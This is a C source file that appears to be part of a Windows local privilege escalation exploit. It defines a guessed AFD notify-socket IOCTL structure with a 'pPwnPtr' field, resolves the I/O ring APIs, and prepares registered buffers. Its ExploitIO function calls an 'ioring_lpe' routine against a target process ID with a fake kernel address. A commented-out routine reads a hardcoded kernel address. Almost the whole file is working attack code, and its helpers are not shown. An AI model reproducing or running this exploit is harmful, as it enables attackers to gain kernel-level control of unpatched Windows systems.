#include <windows.h>
#include <winternl.h>
#include <ioringapi.h>

#include "win_defs.h"
#include "ioring.h"

#define AFD_NOTIFYSOCK_IOCTL 0x12127

// Good enough™ best guess on what this structure is.
typedef struct AFD_NOTIFYSOCK_DATA
{
    HANDLE hCompletion;
    PVOID  pData1;
    PVOID  pData2;
    PVOID  pPwnPtr;
    DWORD  dwCounter;
    DWORD  dwTimeout;
    DWORD  dwLen;
    char   lol[0x4];
} AFD_NOTIFYSOCK_DATA;


__declspec(noinline) int GetNtFunctions(void)
{
    int ret = 0;
    HMODULE hK  = GetModuleHandleA("kernel32.dll");
    HMODULE hKB = GetModuleHandleA("kernelbase.dll");
    
    _NtQuerySystemInformation = (unsigned long(__stdcall*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    if (_NtQuerySystemInformation == NULL)
    {
        return -1;
    }
    
    _CreateIoRing = (CreateIoRingT)GetProcAddress(hK, "CreateIoRing");
    if (_CreateIoRing == 0)
    {
        _CreateIoRing = (CreateIoRingT)GetProcAddress(hKB, "CreateIoRing");
    }

    _BuildIoRingWriteFile = (BuildIoRingWriteFileT)GetProcAddress(hK, "BuildIoRingWriteFile");
    if (_BuildIoRingWriteFile == 0)
    {
        _BuildIoRingWriteFile = (BuildIoRingWriteFileT)GetProcAddress(hKB, "BuildIoRingWriteFile");
    }

    _BuildIoRingReadFile = (BuildIoRingReadFileT)GetProcAddress(hK, "BuildIoRingReadFile");
    if (_BuildIoRingReadFile == 0)
    {
        _BuildIoRingReadFile = (BuildIoRingReadFileT)GetProcAddress(hKB, "BuildIoRingReadFile");
    }

    _PopIoRingCompletion = (PopIoRingCompletionT)GetProcAddress(hK, "PopIoRingCompletion");
    if (_PopIoRingCompletion == 0)
    {
        _PopIoRingCompletion = (PopIoRingCompletionT)GetProcAddress(hKB, "PopIoRingCompletion");
    }

    _SubmitIoRing = (SubmitIoRingT)GetProcAddress(hK, "SubmitIoRing");
    if (_SubmitIoRing == 0)
    {
        _SubmitIoRing = (SubmitIoRingT)GetProcAddress(hKB, "SubmitIoRing");
    }
    
    if (_CreateIoRing == 0 || _BuildIoRingWriteFile == 0 || _BuildIoRingReadFile == 0 || _PopIoRingCompletion == 0 || _SubmitIoRing == 0)
    {
        ret = -1;
    }

    return ret;
}

PIORING_OBJECT pMyIoRing = NULL;
__declspec(noinline) BOOL PrepareIO(PVOID* pBuffers, PVOID* pBuffersCount)
{
    int ret = -1;
    
    ret = GetNtFunctions();
    
    if (ret != 0)
    {
        return FALSE;
    }
    
    ret = ioring_setup(&pMyIoRing);
    
    if (ret != 0)
    {
        return FALSE;
    }

    *pBuffers       = &pMyIoRing->RegBuffers;
    *pBuffersCount  = &pMyIoRing->RegBuffersCount;

    return TRUE;
}

__declspec(noinline) BOOL ExploitIO(DWORD dPid, PVOID pFakeAddr)
{
    int ret = ioring_lpe(dPid, pFakeAddr, 0x1);
    return (ret == 0);
}
/*
__declspec(noinline) int ReadIo(PVOID p)
{
    ULONG_PTR y;
    int ret = ioring_read2(p, (PVOID)0xfffff80358e00000, &y, sizeof(ULONG64));

    return ret;
}
*/